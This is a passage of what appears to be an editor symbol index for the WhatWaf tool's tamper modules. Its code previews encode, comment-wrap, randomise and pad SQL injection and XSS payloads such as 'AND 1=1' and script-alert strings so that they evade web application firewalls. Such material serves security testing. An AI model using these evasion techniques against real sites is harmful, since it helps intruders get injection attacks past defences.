        "description": "tools.whatwaf.content.tampers.booleanmask",
        "peekOfCode": "__example_payload__ = \"' AND 1=1 OR 2=2 '\"\n__type__ = \"mask the booleans with their symbolic counterparts\"\ndef tamper(payload, **kwargs):\n    return re.sub(r\"(?i)and\", \"%26%26\", re.sub(r\"(?i)or\", \"%7C%7C\", payload))",
        "detail": "tools.whatwaf.content.tampers.booleanmask",
        "documentation": {}
    },
    {
        "label": "__type__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.booleanmask",
        "description": "tools.whatwaf.content.tampers.booleanmask",
        "peekOfCode": "__type__ = \"mask the booleans with their symbolic counterparts\"\ndef tamper(payload, **kwargs):\n    return re.sub(r\"(?i)and\", \"%26%26\", re.sub(r\"(?i)or\", \"%7C%7C\", payload))",
        "detail": "tools.whatwaf.content.tampers.booleanmask",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "tools.whatwaf.content.tampers.doubleurlencode",
        "description": "tools.whatwaf.content.tampers.doubleurlencode",
        "peekOfCode": "def tamper(payload, **kwargs):\n    danger_chars = string.punctuation + \" \"\n    extra_danger_chars = (\"_\", \".\")\n    retval = \"\"\n    for char in list(payload):\n        if char not in danger_chars or char == \"*\":\n            retval += char\n        elif char == extra_danger_chars[0]:\n            retval += quote_plus(\"%5F\")\n        elif char == extra_danger_chars[1]:",
        "detail": "tools.whatwaf.content.tampers.doubleurlencode",
        "documentation": {}
    },
    {
        "label": "__example_payload__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.doubleurlencode",
        "description": "tools.whatwaf.content.tampers.doubleurlencode",
        "peekOfCode": "__example_payload__ = \"<img src=x onerror=\\\"input\\\">\"\n__type__ = \"double URL encoding the payload characters\"\ndef tamper(payload, **kwargs):\n    danger_chars = string.punctuation + \" \"\n    extra_danger_chars = (\"_\", \".\")\n    retval = \"\"\n    for char in list(payload):\n        if char not in danger_chars or char == \"*\":\n            retval += char\n        elif char == extra_danger_chars[0]:",
        "detail": "tools.whatwaf.content.tampers.doubleurlencode",
        "documentation": {}
    },
    {
        "label": "__type__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.doubleurlencode",
        "description": "tools.whatwaf.content.tampers.doubleurlencode",
        "peekOfCode": "__type__ = \"double URL encoding the payload characters\"\ndef tamper(payload, **kwargs):\n    danger_chars = string.punctuation + \" \"\n    extra_danger_chars = (\"_\", \".\")\n    retval = \"\"\n    for char in list(payload):\n        if char not in danger_chars or char == \"*\":\n            retval += char\n        elif char == extra_danger_chars[0]:\n            retval += quote_plus(\"%5F\")",
        "detail": "tools.whatwaf.content.tampers.doubleurlencode",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "tools.whatwaf.content.tampers.enclosebrackets",
        "description": "tools.whatwaf.content.tampers.enclosebrackets",
        "peekOfCode": "def tamper(payload, **kwargs):\n    payload = str(payload)\n    to_enclose = string.digits\n    if not any(i in list(payload) for i in to_enclose):\n        return payload\n    retval = \"\"\n    for char in payload:\n        if char in to_enclose:\n            retval += \"[{}]\".format(char)\n        else:",
        "detail": "tools.whatwaf.content.tampers.enclosebrackets",
        "documentation": {}
    },
    {
        "label": "__example_payload__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.enclosebrackets",
        "description": "tools.whatwaf.content.tampers.enclosebrackets",
        "peekOfCode": "__example_payload__ = 'AND 1=1,<script>alert(\"1,2,3,4,5);</script>'\n__type__ = \"enclosing numbers into brackets\"\ndef tamper(payload, **kwargs):\n    payload = str(payload)\n    to_enclose = string.digits\n    if not any(i in list(payload) for i in to_enclose):\n        return payload\n    retval = \"\"\n    for char in payload:\n        if char in to_enclose:",
        "detail": "tools.whatwaf.content.tampers.enclosebrackets",
        "documentation": {}
    },
    {
        "label": "__type__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.enclosebrackets",
        "description": "tools.whatwaf.content.tampers.enclosebrackets",
        "peekOfCode": "__type__ = \"enclosing numbers into brackets\"\ndef tamper(payload, **kwargs):\n    payload = str(payload)\n    to_enclose = string.digits\n    if not any(i in list(payload) for i in to_enclose):\n        return payload\n    retval = \"\"\n    for char in payload:\n        if char in to_enclose:\n            retval += \"[{}]\".format(char)",
        "detail": "tools.whatwaf.content.tampers.enclosebrackets",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "tools.whatwaf.content.tampers.escapequotes",
        "description": "tools.whatwaf.content.tampers.escapequotes",
        "peekOfCode": "def tamper(payload, **kwargs):\n    modifier = r\"\\\\\"\n    retval = \"\"\n    for char in payload:\n        if char == \"'\":\n            retval += \"{}'\".format(modifier)\n        elif char == '\"':\n            retval += '{}\"'.format(modifier)\n        else:\n            retval += char",
        "detail": "tools.whatwaf.content.tampers.escapequotes",
        "documentation": {}
    },
    {
        "label": "__example_payload__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.escapequotes",
        "description": "tools.whatwaf.content.tampers.escapequotes",
        "peekOfCode": "__example_payload__ = \"\"\"' AND 1=1 \" OR 1=10 '\"\"\"\n__type__ = \"escaping quotes with slashes\"\ndef tamper(payload, **kwargs):\n    modifier = r\"\\\\\"\n    retval = \"\"\n    for char in payload:\n        if char == \"'\":\n            retval += \"{}'\".format(modifier)\n        elif char == '\"':\n            retval += '{}\"'.format(modifier)",
        "detail": "tools.whatwaf.content.tampers.escapequotes",
        "documentation": {}
    },
    {
        "label": "__type__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.escapequotes",
        "description": "tools.whatwaf.content.tampers.escapequotes",
        "peekOfCode": "__type__ = \"escaping quotes with slashes\"\ndef tamper(payload, **kwargs):\n    modifier = r\"\\\\\"\n    retval = \"\"\n    for char in payload:\n        if char == \"'\":\n            retval += \"{}'\".format(modifier)\n        elif char == '\"':\n            retval += '{}\"'.format(modifier)\n        else:",
        "detail": "tools.whatwaf.content.tampers.escapequotes",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "tools.whatwaf.content.tampers.lowercase",
        "description": "tools.whatwaf.content.tampers.lowercase",
        "peekOfCode": "def tamper(payload, **kwargs):\n    payload = str(payload)\n    return payload.lower()",
        "detail": "tools.whatwaf.content.tampers.lowercase",
        "documentation": {}
    },
    {
        "label": "__example_payload__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.lowercase",
        "description": "tools.whatwaf.content.tampers.lowercase",
        "peekOfCode": "__example_payload__ = \"AND 1=1\"\n__type__ = \"turning the payload into its lowercase equivalent\"\ndef tamper(payload, **kwargs):\n    payload = str(payload)\n    return payload.lower()",
        "detail": "tools.whatwaf.content.tampers.lowercase",
        "documentation": {}
    },
    {
        "label": "__type__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.lowercase",
        "description": "tools.whatwaf.content.tampers.lowercase",
        "peekOfCode": "__type__ = \"turning the payload into its lowercase equivalent\"\ndef tamper(payload, **kwargs):\n    payload = str(payload)\n    return payload.lower()",
        "detail": "tools.whatwaf.content.tampers.lowercase",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "tools.whatwaf.content.tampers.maskenclosebrackets",
        "description": "tools.whatwaf.content.tampers.maskenclosebrackets",
        "peekOfCode": "def tamper(payload, **kwargs):\n    payload = str(payload)\n    to_enclose = string.digits\n    if not any(i in payload for i in to_enclose):\n        return payload\n    retval = \"\"\n    for char in payload:\n        if char in to_enclose:\n            retval += \"[%EF%BC%87{}%EF%BC%87]\".format(char)\n        else:",
        "detail": "tools.whatwaf.content.tampers.maskenclosebrackets",
        "documentation": {}
    },
    {
        "label": "__example_payload__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.maskenclosebrackets",
        "description": "tools.whatwaf.content.tampers.maskenclosebrackets",
        "peekOfCode": "__example_payload__ = 'AND 1=1,<script>alert(\"1,2,3,4,5);</script>'\n__type__ = \"enclosing brackets and masking an apostrophe around the character in the brackets\"\ndef tamper(payload, **kwargs):\n    payload = str(payload)\n    to_enclose = string.digits\n    if not any(i in payload for i in to_enclose):\n        return payload\n    retval = \"\"\n    for char in payload:\n        if char in to_enclose:",
        "detail": "tools.whatwaf.content.tampers.maskenclosebrackets",
        "documentation": {}
    },
    {
        "label": "__type__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.maskenclosebrackets",
        "description": "tools.whatwaf.content.tampers.maskenclosebrackets",
        "peekOfCode": "__type__ = \"enclosing brackets and masking an apostrophe around the character in the brackets\"\ndef tamper(payload, **kwargs):\n    payload = str(payload)\n    to_enclose = string.digits\n    if not any(i in payload for i in to_enclose):\n        return payload\n    retval = \"\"\n    for char in payload:\n        if char in to_enclose:\n            retval += \"[%EF%BC%87{}%EF%BC%87]\".format(char)",
        "detail": "tools.whatwaf.content.tampers.maskenclosebrackets",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "tools.whatwaf.content.tampers.modsec",
        "description": "tools.whatwaf.content.tampers.modsec",
        "peekOfCode": "def tamper(payload, **kwargs):\n    return \"/*!00000{}*/\".format(payload)",
        "detail": "tools.whatwaf.content.tampers.modsec",
        "documentation": {}
    },
    {
        "label": "__example_payload__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.modsec",
        "description": "tools.whatwaf.content.tampers.modsec",
        "peekOfCode": "__example_payload__ = \"AND 1=1\"\n__type__ = \"putting the payload in-between a comment with obfuscation in it\"\ndef tamper(payload, **kwargs):\n    return \"/*!00000{}*/\".format(payload)",
        "detail": "tools.whatwaf.content.tampers.modsec",
        "documentation": {}
    },
    {
        "label": "__type__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.modsec",
        "description": "tools.whatwaf.content.tampers.modsec",
        "peekOfCode": "__type__ = \"putting the payload in-between a comment with obfuscation in it\"\ndef tamper(payload, **kwargs):\n    return \"/*!00000{}*/\".format(payload)",
        "detail": "tools.whatwaf.content.tampers.modsec",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "tools.whatwaf.content.tampers.modsecspace2comment",
        "description": "tools.whatwaf.content.tampers.modsecspace2comment",
        "peekOfCode": "def tamper(payload, **kwargs):\n    modifier = \"/**/\"\n    secondary_modifier = \"/*!00000{}*/\"\n    retval = \"\"\n    for char in payload:\n        if char == \" \":\n            retval += modifier\n        else:\n            retval += char\n    return secondary_modifier.format(retval)",
        "detail": "tools.whatwaf.content.tampers.modsecspace2comment",
        "documentation": {}
    },
    {
        "label": "__example_payload__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.modsecspace2comment",
        "description": "tools.whatwaf.content.tampers.modsecspace2comment",
        "peekOfCode": "__example_payload__ = \"SELECT * FROM information_schema.tables\"\n__type__ = \"obfuscating payload by passing it between comments with obfuscation and changing spaces to comments\"\ndef tamper(payload, **kwargs):\n    modifier = \"/**/\"\n    secondary_modifier = \"/*!00000{}*/\"\n    retval = \"\"\n    for char in payload:\n        if char == \" \":\n            retval += modifier\n        else:",
        "detail": "tools.whatwaf.content.tampers.modsecspace2comment",
        "documentation": {}
    },
    {
        "label": "__type__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.modsecspace2comment",
        "description": "tools.whatwaf.content.tampers.modsecspace2comment",
        "peekOfCode": "__type__ = \"obfuscating payload by passing it between comments with obfuscation and changing spaces to comments\"\ndef tamper(payload, **kwargs):\n    modifier = \"/**/\"\n    secondary_modifier = \"/*!00000{}*/\"\n    retval = \"\"\n    for char in payload:\n        if char == \" \":\n            retval += modifier\n        else:\n            retval += char",
        "detail": "tools.whatwaf.content.tampers.modsecspace2comment",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "tools.whatwaf.content.tampers.obfuscatebyhtmlcomment",
        "description": "tools.whatwaf.content.tampers.obfuscatebyhtmlcomment",
        "peekOfCode": "def tamper(payload, **kwargs):\n    retval = \"\"\n    html_comment = \"<!--%-->\"\n    snipes = (\"<\", \"/>\", \">\", \"t>\" \"script\")\n    if not any(s in payload for s in snipes):\n        # no point in running it through if there's nothing useful in it\n        return payload\n    for char in payload:\n        if char == \">\":\n            char = \"{}>\".format(html_comment)",
        "detail": "tools.whatwaf.content.tampers.obfuscatebyhtmlcomment",
        "documentation": {}
    },
    {
        "label": "__example_payload__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.obfuscatebyhtmlcomment",
        "description": "tools.whatwaf.content.tampers.obfuscatebyhtmlcomment",
        "peekOfCode": "__example_payload__ = \"'/><script>alert('whatwaf');</script>\"\n__type__ = \"obfuscating script tags with HTML comments'\"\ndef tamper(payload, **kwargs):\n    retval = \"\"\n    html_comment = \"<!--%-->\"\n    snipes = (\"<\", \"/>\", \">\", \"t>\" \"script\")\n    if not any(s in payload for s in snipes):\n        # no point in running it through if there's nothing useful in it\n        return payload\n    for char in payload:",
        "detail": "tools.whatwaf.content.tampers.obfuscatebyhtmlcomment",
        "documentation": {}
    },
    {
        "label": "__type__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.obfuscatebyhtmlcomment",
        "description": "tools.whatwaf.content.tampers.obfuscatebyhtmlcomment",
        "peekOfCode": "__type__ = \"obfuscating script tags with HTML comments'\"\ndef tamper(payload, **kwargs):\n    retval = \"\"\n    html_comment = \"<!--%-->\"\n    snipes = (\"<\", \"/>\", \">\", \"t>\" \"script\")\n    if not any(s in payload for s in snipes):\n        # no point in running it through if there's nothing useful in it\n        return payload\n    for char in payload:\n        if char == \">\":",
        "detail": "tools.whatwaf.content.tampers.obfuscatebyhtmlcomment",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "tools.whatwaf.content.tampers.obfuscatebyhtmlentity",
        "description": "tools.whatwaf.content.tampers.obfuscatebyhtmlentity",
        "peekOfCode": "def tamper(payload, **kwargs):\n    payload = str(payload)\n    retval = \"\"\n    skip = \";\"\n    encoding_schema = {\n        \" \": \"&nbsp;\", \"<\": \"&lt;\", \">\": \"&gt;\",\n        \"&\": \"&amp;\", '\"': \"&quot;\", \"'\": \"&apos;\",\n    }\n    if not any(c in payload for c in encoding_schema.keys()):\n        return payload",
        "detail": "tools.whatwaf.content.tampers.obfuscatebyhtmlentity",
        "documentation": {}
    },
    {
        "label": "__example_payload__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.obfuscatebyhtmlentity",
        "description": "tools.whatwaf.content.tampers.obfuscatebyhtmlentity",
        "peekOfCode": "__example_payload__ = r\"\"\"&\\lt' AND 1=1 ',<script>alert(\"test\");</script>\"\"\"\n__type__ = \"changing the payload characters into their HTML entities\"\ndef tamper(payload, **kwargs):\n    payload = str(payload)\n    retval = \"\"\n    skip = \";\"\n    encoding_schema = {\n        \" \": \"&nbsp;\", \"<\": \"&lt;\", \">\": \"&gt;\",\n        \"&\": \"&amp;\", '\"': \"&quot;\", \"'\": \"&apos;\",\n    }",
        "detail": "tools.whatwaf.content.tampers.obfuscatebyhtmlentity",
        "documentation": {}
    },
    {
        "label": "__type__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.obfuscatebyhtmlentity",
        "description": "tools.whatwaf.content.tampers.obfuscatebyhtmlentity",
        "peekOfCode": "__type__ = \"changing the payload characters into their HTML entities\"\ndef tamper(payload, **kwargs):\n    payload = str(payload)\n    retval = \"\"\n    skip = \";\"\n    encoding_schema = {\n        \" \": \"&nbsp;\", \"<\": \"&lt;\", \">\": \"&gt;\",\n        \"&\": \"&amp;\", '\"': \"&quot;\", \"'\": \"&apos;\",\n    }\n    if not any(c in payload for c in encoding_schema.keys()):",
        "detail": "tools.whatwaf.content.tampers.obfuscatebyhtmlentity",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "tools.whatwaf.content.tampers.obfuscatebyordinal",
        "description": "tools.whatwaf.content.tampers.obfuscatebyordinal",
        "peekOfCode": "def tamper(payload, **kwargs):\n    payload = str(payload)\n    retval = \"\"\n    danger_characters = \"%&<>/\\\\;'\\\"\"\n    for char in payload:\n        if char in danger_characters:\n            retval += \"%{}\".format(ord(char))\n        else:\n            retval += char\n    return retval",
        "detail": "tools.whatwaf.content.tampers.obfuscatebyordinal",
        "documentation": {}
    },
    {
        "label": "__example_payload__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.obfuscatebyordinal",
        "description": "tools.whatwaf.content.tampers.obfuscatebyordinal",
        "peekOfCode": "__example_payload__ = \"<script>alert(\\\"XSS\\\");</script>\"\n__type__ = \"changing certain characters in the payload into their ordinal equivalent\"\ndef tamper(payload, **kwargs):\n    payload = str(payload)\n    retval = \"\"\n    danger_characters = \"%&<>/\\\\;'\\\"\"\n    for char in payload:\n        if char in danger_characters:\n            retval += \"%{}\".format(ord(char))\n        else:",
        "detail": "tools.whatwaf.content.tampers.obfuscatebyordinal",
        "documentation": {}
    },
    {
        "label": "__type__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.obfuscatebyordinal",
        "description": "tools.whatwaf.content.tampers.obfuscatebyordinal",
        "peekOfCode": "__type__ = \"changing certain characters in the payload into their ordinal equivalent\"\ndef tamper(payload, **kwargs):\n    payload = str(payload)\n    retval = \"\"\n    danger_characters = \"%&<>/\\\\;'\\\"\"\n    for char in payload:\n        if char in danger_characters:\n            retval += \"%{}\".format(ord(char))\n        else:\n            retval += char",
        "detail": "tools.whatwaf.content.tampers.obfuscatebyordinal",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "tools.whatwaf.content.tampers.prependnull",
        "description": "tools.whatwaf.content.tampers.prependnull",
        "peekOfCode": "def tamper(payload, **kwargs):\n    return \"%00{}\".format(payload)",
        "detail": "tools.whatwaf.content.tampers.prependnull",
        "documentation": {}
    },
    {
        "label": "__example_payload__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.prependnull",
        "description": "tools.whatwaf.content.tampers.prependnull",
        "peekOfCode": "__example_payload__ = \"' AND 1=1 '\"\n__type__ = \"pre-pending a NULL character at the start of the payload\"\ndef tamper(payload, **kwargs):\n    return \"%00{}\".format(payload)",
        "detail": "tools.whatwaf.content.tampers.prependnull",
        "documentation": {}
    },
    {
        "label": "__type__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.prependnull",
        "description": "tools.whatwaf.content.tampers.prependnull",
        "peekOfCode": "__type__ = \"pre-pending a NULL character at the start of the payload\"\ndef tamper(payload, **kwargs):\n    return \"%00{}\".format(payload)",
        "detail": "tools.whatwaf.content.tampers.prependnull",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "tools.whatwaf.content.tampers.randomcase",
        "description": "tools.whatwaf.content.tampers.randomcase",
        "peekOfCode": "def tamper(payload, **kwargs):\n    payload = str(payload)\n    identifier = (1, 2)\n    retval = \"\"\n    for char in payload:\n        if random.choice(identifier) == 1:\n            retval += char.upper()\n        else:\n            retval += char.lower()\n    return retval",
        "detail": "tools.whatwaf.content.tampers.randomcase",
        "documentation": {}
    },
    {
        "label": "__example_payload__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.randomcase",
        "description": "tools.whatwaf.content.tampers.randomcase",
        "peekOfCode": "__example_payload__ = \"AS start WHERE 1601=1601 UNION ALL SELECT NULL,NULL\"\n__type__ = \"changing the character case of the payload randomly with either upper or lower case\"\ndef tamper(payload, **kwargs):\n    payload = str(payload)\n    identifier = (1, 2)\n    retval = \"\"\n    for char in payload:\n        if random.choice(identifier) == 1:\n            retval += char.upper()\n        else:",
        "detail": "tools.whatwaf.content.tampers.randomcase",
        "documentation": {}
    },
    {
        "label": "__type__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.randomcase",
        "description": "tools.whatwaf.content.tampers.randomcase",
        "peekOfCode": "__type__ = \"changing the character case of the payload randomly with either upper or lower case\"\ndef tamper(payload, **kwargs):\n    payload = str(payload)\n    identifier = (1, 2)\n    retval = \"\"\n    for char in payload:\n        if random.choice(identifier) == 1:\n            retval += char.upper()\n        else:\n            retval += char.lower()",
        "detail": "tools.whatwaf.content.tampers.randomcase",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "tools.whatwaf.content.tampers.randomcomments",
        "description": "tools.whatwaf.content.tampers.randomcomments",
        "peekOfCode": "def tamper(payload, **kwargs):\n    modifer = \"/**/\"\n    characters = string.ascii_letters\n    retval = \"\"\n    for char in payload:\n        random_chars = [random.choice(characters) for _ in range(10)]\n        if char in random_chars:\n            retval += \"{}{}\".format(modifer, char)\n        else:\n            retval += char",
        "detail": "tools.whatwaf.content.tampers.randomcomments",
        "documentation": {}
    },
    {
        "label": "__example_payload__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.randomcomments",
        "description": "tools.whatwaf.content.tampers.randomcomments",
        "peekOfCode": "__example_payload__ = \"' AND 1=1 ' OR 10=11,<script>alert('');</script>\"\n__type__ = \"implanting random comments into the payload\"\ndef tamper(payload, **kwargs):\n    modifer = \"/**/\"\n    characters = string.ascii_letters\n    retval = \"\"\n    for char in payload:\n        random_chars = [random.choice(characters) for _ in range(10)]\n        if char in random_chars:\n            retval += \"{}{}\".format(modifer, char)",
        "detail": "tools.whatwaf.content.tampers.randomcomments",
        "documentation": {}
    },
    {
        "label": "__type__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.randomcomments",
        "description": "tools.whatwaf.content.tampers.randomcomments",
        "peekOfCode": "__type__ = \"implanting random comments into the payload\"\ndef tamper(payload, **kwargs):\n    modifer = \"/**/\"\n    characters = string.ascii_letters\n    retval = \"\"\n    for char in payload:\n        random_chars = [random.choice(characters) for _ in range(10)]\n        if char in random_chars:\n            retval += \"{}{}\".format(modifer, char)\n        else:",
        "detail": "tools.whatwaf.content.tampers.randomcomments",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "tools.whatwaf.content.tampers.randomdecoys",
        "description": "tools.whatwaf.content.tampers.randomdecoys",
        "peekOfCode": "def tamper(payload, **kwargs):\n    retval = \"\"\n    # https://stackoverflow.com/questions/27044221/regular-expression-to-match-different-script-tags-in-python\n    searcher = re.compile(r\"(<\\s*?script[\\s\\S]*?(?:(?:src=[\\'\\\"](.*?)[\\'\\\"])(?:[\\S\\s]*?))?>)([\\s\\S]*?)(</script>)\", re.I)\n    if searcher.search(payload) is None:\n        # we'll just skip payloads that aren't xss\n        return payload\n    decoys = (\n        \"<decoy>\", \"<lillypopper>\",\n        \"<whatwaf>\", \"<xanxss>\",",
        "detail": "tools.whatwaf.content.tampers.randomdecoys",
        "documentation": {}
    },
    {
        "label": "__example_payload__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.randomdecoys",
        "description": "tools.whatwaf.content.tampers.randomdecoys",
        "peekOfCode": "__example_payload__ = \"<script>alert(1);</script>\"\n__type__ = \"add decoy tags to the script\"\ndef tamper(payload, **kwargs):\n    retval = \"\"\n    # https://stackoverflow.com/questions/27044221/regular-expression-to-match-different-script-tags-in-python\n    searcher = re.compile(r\"(<\\s*?script[\\s\\S]*?(?:(?:src=[\\'\\\"](.*?)[\\'\\\"])(?:[\\S\\s]*?))?>)([\\s\\S]*?)(</script>)\", re.I)\n    if searcher.search(payload) is None:\n        # we'll just skip payloads that aren't xss\n        return payload\n    decoys = (",
        "detail": "tools.whatwaf.content.tampers.randomdecoys",
        "documentation": {}
    },
    {
        "label": "__type__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.randomdecoys",
        "description": "tools.whatwaf.content.tampers.randomdecoys",
        "peekOfCode": "__type__ = \"add decoy tags to the script\"\ndef tamper(payload, **kwargs):\n    retval = \"\"\n    # https://stackoverflow.com/questions/27044221/regular-expression-to-match-different-script-tags-in-python\n    searcher = re.compile(r\"(<\\s*?script[\\s\\S]*?(?:(?:src=[\\'\\\"](.*?)[\\'\\\"])(?:[\\S\\s]*?))?>)([\\s\\S]*?)(</script>)\", re.I)\n    if searcher.search(payload) is None:\n        # we'll just skip payloads that aren't xss\n        return payload\n    decoys = (\n        \"<decoy>\", \"<lillypopper>\",",
        "detail": "tools.whatwaf.content.tampers.randomdecoys",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "tools.whatwaf.content.tampers.randomjunkcharacters",
        "description": "tools.whatwaf.content.tampers.randomjunkcharacters",
        "peekOfCode": "def tamper(payload, **kwargs):\n    junk_chars = \"!#$%&()*~+-_.,:;?@[/|\\]^`\"\n    retval = \"\"\n    for i, char in enumerate(payload, start=1):\n        amount = random.randint(10, 15)\n        if char == \">\":\n            retval += \">\"\n            for _ in range(amount):\n                retval += random.choice(junk_chars)\n        elif char == \"<\":",
        "detail": "tools.whatwaf.content.tampers.randomjunkcharacters",
        "documentation": {}
    },
    {
        "label": "__example_payload__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.randomjunkcharacters",
        "description": "tools.whatwaf.content.tampers.randomjunkcharacters",
        "peekOfCode": "__example_payload__ = \"<script>alert('1');</script>\"\n__type__ = \"adding random junk characters into the payload to bypass regex based protection\"\ndef tamper(payload, **kwargs):\n    junk_chars = \"!#$%&()*~+-_.,:;?@[/|\\]^`\"\n    retval = \"\"\n    for i, char in enumerate(payload, start=1):\n        amount = random.randint(10, 15)\n        if char == \">\":\n            retval += \">\"\n            for _ in range(amount):",
        "detail": "tools.whatwaf.content.tampers.randomjunkcharacters",
        "documentation": {}
    },
    {
        "label": "__type__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.randomjunkcharacters",
        "description": "tools.whatwaf.content.tampers.randomjunkcharacters",
        "peekOfCode": "__type__ = \"adding random junk characters into the payload to bypass regex based protection\"\ndef tamper(payload, **kwargs):\n    junk_chars = \"!#$%&()*~+-_.,:;?@[/|\\]^`\"\n    retval = \"\"\n    for i, char in enumerate(payload, start=1):\n        amount = random.randint(10, 15)\n        if char == \">\":\n            retval += \">\"\n            for _ in range(amount):\n                retval += random.choice(junk_chars)",
        "detail": "tools.whatwaf.content.tampers.randomjunkcharacters",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "tools.whatwaf.content.tampers.randomtabify",
        "description": "tools.whatwaf.content.tampers.randomtabify",
        "peekOfCode": "def tamper(payload, **kwargs):\n    retval = \"\"\n    for char in payload:\n        edit = random.choice(range(0, 10))\n        if edit >= 5 and char.isspace():\n            retval += \"        \"\n        elif edit <= 6 and char.isspace():\n            retval += r\"\\t\"\n        else:\n            retval += char",
        "detail": "tools.whatwaf.content.tampers.randomtabify",
        "documentation": {}
    },
    {
        "label": "__example_payload__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.randomtabify",
        "description": "tools.whatwaf.content.tampers.randomtabify",
        "peekOfCode": "__example_payload__ = \"SELECT user FROM information_schema.tables AND user = 'test user';\"\n__type__ = \"replacing the spaces in the payload with either the tab character or eight spaces\"\ndef tamper(payload, **kwargs):\n    retval = \"\"\n    for char in payload:\n        edit = random.choice(range(0, 10))\n        if edit >= 5 and char.isspace():\n            retval += \"        \"\n        elif edit <= 6 and char.isspace():\n            retval += r\"\\t\"",
        "detail": "tools.whatwaf.content.tampers.randomtabify",
        "documentation": {}
    },
    {
        "label": "__type__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.randomtabify",
        "description": "tools.whatwaf.content.tampers.randomtabify",
        "peekOfCode": "__type__ = \"replacing the spaces in the payload with either the tab character or eight spaces\"\ndef tamper(payload, **kwargs):\n    retval = \"\"\n    for char in payload:\n        edit = random.choice(range(0, 10))\n        if edit >= 5 and char.isspace():\n            retval += \"        \"\n        elif edit <= 6 and char.isspace():\n            retval += r\"\\t\"\n        else:",
        "detail": "tools.whatwaf.content.tampers.randomtabify",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "tools.whatwaf.content.tampers.randomunicode",
        "description": "tools.whatwaf.content.tampers.randomunicode",
        "peekOfCode": "def tamper(payload, **kwargs):\n    def glyph(n=6):\n        res = u\"\"\n        for i in range(n):\n            res = u\"%%u%04x\" % random.randrange(0xD7FF)\n        return res\n    identifiers = range(10)\n    retval = \"\"\n    for char in payload:\n        modifier = random.choice(identifiers)",
        "detail": "tools.whatwaf.content.tampers.randomunicode",
        "documentation": {}
    },
    {
        "label": "__example_payload__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.randomunicode",
        "description": "tools.whatwaf.content.tampers.randomunicode",
        "peekOfCode": "__example_payload__ = \"AND 1=1,<script>alert(\\\"test\\\");</script>\"\n__type__ = \"inserting random UTF-8 characters into the payload\"\ndef tamper(payload, **kwargs):\n    def glyph(n=6):\n        res = u\"\"\n        for i in range(n):\n            res = u\"%%u%04x\" % random.randrange(0xD7FF)\n        return res\n    identifiers = range(10)\n    retval = \"\"",
        "detail": "tools.whatwaf.content.tampers.randomunicode",
        "documentation": {}
    },
    {
        "label": "__type__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.randomunicode",
        "description": "tools.whatwaf.content.tampers.randomunicode",
        "peekOfCode": "__type__ = \"inserting random UTF-8 characters into the payload\"\ndef tamper(payload, **kwargs):\n    def glyph(n=6):\n        res = u\"\"\n        for i in range(n):\n            res = u\"%%u%04x\" % random.randrange(0xD7FF)\n        return res\n    identifiers = range(10)\n    retval = \"\"\n    for char in payload:",
        "detail": "tools.whatwaf.content.tampers.randomunicode",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "tools.whatwaf.content.tampers.randomwildcard",
        "description": "tools.whatwaf.content.tampers.randomwildcard",
